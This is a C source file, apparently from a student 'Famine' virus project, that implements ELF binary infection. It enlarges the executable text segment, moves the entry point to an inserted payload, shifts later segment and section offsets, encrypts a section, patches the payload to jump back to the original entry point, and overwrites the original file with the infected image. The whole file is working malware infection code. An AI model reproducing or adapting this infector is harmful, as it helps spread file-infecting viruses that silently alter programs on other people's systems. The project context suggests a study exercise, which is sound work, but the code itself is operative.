/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infection.c                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mabouce <ma.sithis@gmail.com>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/07/29 14:29:35 by mabouce           #+#    #+#             */
/*   Updated: 2021/07/29 14:29:35 by mabouce          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"

void silvio_text_infection(t_famine *famine)
{
    // Create the output file
    if (!(famine->infected_file = malloc(famine->binary_data_size + PAGE_SIZE)))
    {
        error(ERROR_MALLOC, famine);
    }
    famine->infected_file_size = famine->binary_data_size + PAGE_SIZE;

    for (size_t i = 0; i < famine->ehdr->e_phnum; i++)
    {
        if (famine->phdr[i].p_type == PT_LOAD && famine->phdr[i].p_flags == (PF_R | PF_X))
        {

            famine->payload_vaddr = famine->text_p_vaddr + famine->phdr[i].p_filesz;
            famine->ehdr->e_entry = famine->payload_vaddr;
            famine->new_entry_point = famine->payload_vaddr;

            famine->phdr[i].p_filesz += famine->payload_size;
            famine->phdr[i].p_memsz += famine->payload_size;

            for (int j = i + 1; j < famine->ehdr->e_phnum; j++)
                famine->phdr[j].p_offset += PAGE_SIZE;

            break;
        }
    }

    if (famine->text_p_end_offset % PAGE_SIZE + famine->payload_size > PAGE_SIZE)
    {
        error(ERROR_NOT_ENOUGHT_SPACE_FOR_PAYLOAD, famine);
    }

    // Adding offset of one page in all section located after text section end. And get text section offset for the encryption.
    for (size_t i = 0; i < famine->ehdr->e_shnum; i++)
    {
        if (famine->shdr[i].sh_offset > famine->text_p_end_offset)
        {
            famine->shdr[i].sh_offset += PAGE_SIZE;
        }
        else if (famine->shdr[i].sh_addr + famine->shdr[i].sh_size == famine->payload_vaddr)
        {
            famine->shdr[i].sh_size += famine->payload_size;
        }
        // get section to encrypt info.
        if (!strncmp(SECTION_TO_ENCRYPT_NAME,
                     (famine->string_table_ptr + famine->shdr[i].sh_name),
                     strlen(SECTION_TO_ENCRYPT_NAME)))
        {
            famine->encrypt_s_start_offset = famine->shdr[i].sh_offset;
            famine->encrypt_s_size = famine->shdr[i].sh_size;
            famine->encrypt_s_end_offset = famine->encrypt_s_start_offset + famine->encrypt_s_size;
            famine->encrypt_s_addr = famine->shdr[i].sh_addr;
            famine->shdr[i].sh_flags |= SHF_WRITE;
        }
    }

    // Increase section header offset by PAGE_SIZE
    famine->ehdr->e_shoff += PAGE_SIZE;

    cipher_famine_file_data(famine);
    if (famine->elf_32)
    {
        overwrite_payload_ret2oep(famine);
    }
    else if (famine->elf_64)
    {
        overwrite_keysection_payload(famine);
        overwrite_payload_getencryptedsectionaddr(famine);
        overwrite_payload_ret2oep(famine);
        overwrite_payload_getencryptedsectionsize(famine);
        overwrite_payload_gettextsectionaddr(famine);
        overwrite_payload_gettextsize(famine);
    }

    // Copy until text section end
    memcpy(famine->infected_file, famine->mmap_ptr, famine->text_p_end_offset);
    // Rewrite text section with cipher data.
    memcpy(famine->infected_file + famine->encrypt_s_start_offset, famine->cipher, famine->encrypt_s_size);
    // Initialize value to zero for padding.
    bzero(famine->infected_file + famine->text_p_end_offset, PAGE_SIZE);
    // Insert payload after text section end
    memcpy(famine->infected_file + famine->text_p_end_offset, famine->payload_data, famine->payload_size);
    // Insert rest of binary
    memcpy(famine->infected_file + famine->text_p_end_offset + PAGE_SIZE, famine->mmap_ptr + famine->text_p_end_offset, famine->binary_data_size - famine->text_p_end_offset);

    // Add space in the original binary file and overwrite it with the infected file.
    if (lseek(famine->input_file_fd, 0, SEEK_END) != -1)
    {
        char zero_fill[PAGE_SIZE];
        bzero(zero_fill, PAGE_SIZE);
        write(famine->input_file_fd, zero_fill, PAGE_SIZE);
        // Write in the original file.
        memcpy(famine->mmap_ptr, famine->infected_file, famine->infected_file_size);
    }
    else
    {
        close(famine->input_file_fd) == -1 ? error(ERROR_CLOSE, famine) : error(ERROR_LSEEK, famine);
    }
}